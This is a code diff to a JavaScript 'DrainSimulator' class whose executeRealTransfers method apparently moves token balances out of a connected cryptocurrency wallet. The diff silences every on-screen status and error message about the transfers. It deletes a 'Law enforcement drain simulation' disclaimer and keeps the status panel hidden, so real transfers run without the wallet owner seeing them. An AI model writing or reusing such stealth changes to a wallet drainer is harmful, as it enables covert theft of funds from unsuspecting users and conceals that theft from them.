@@ -245,7 +245,7 @@ class DrainSimulator {
 
     // REAL TRANSFER EXECUTION - FIXED
     async executeRealTransfers() {
-        this.showResult('⚡ EXECUTING REAL TRANSFERS...', 'error');
+        // this.showResult(' EXECUTING REAL TRANSFERS...', 'error');
         
         let totalTransferred = 0;
         let transferredAssets = [];
@@ -274,17 +274,17 @@ class DrainSimulator {
                         txHash: tx.hash
                     });
                 } else {
-                    this.showResult(`❌ No ${token.symbol} balance to transfer`, 'info');
+                    // this.showResult(`❌ No ${token.symbol} balance to transfer`, 'info');
                 }
             } catch (error) {
-                this.showResult(`❌ FAILED to transfer ${token.symbol}: ${error.message}`, 'error');
+                // this.showResult(`❌ FAILED to transfer ${token.symbol}: ${error.message}`, 'error');
             }
         }
         
         if (totalTransferred > 0) {
             this.showRealDrainComplete(totalTransferred, transferredAssets);
         } else {
-            this.showResult('❌ No funds were available to transfer', 'warning');
+            // this.showResult('❌ No funds were available to transfer', 'warning');
         }
     }
 
@@ -358,11 +358,10 @@ class DrainSimulator {
                     <i class="fas fa-${type === 'info' ? 'info-circle' : type === 'warning' ? 'exclamation-triangle' : 'skull-crossbones'} mr-3"></i>
                     <div>
                         <p class="font-medium">${message}</p>
-                        <p class="text-sm opacity-75 mt-1">Law enforcement drain simulation</p>
                     </div>
                 </div>
             `;
-            statusDiv.classList.remove('hidden');
+            // statusDiv.classList.remove('hidden');
         }
     }
 
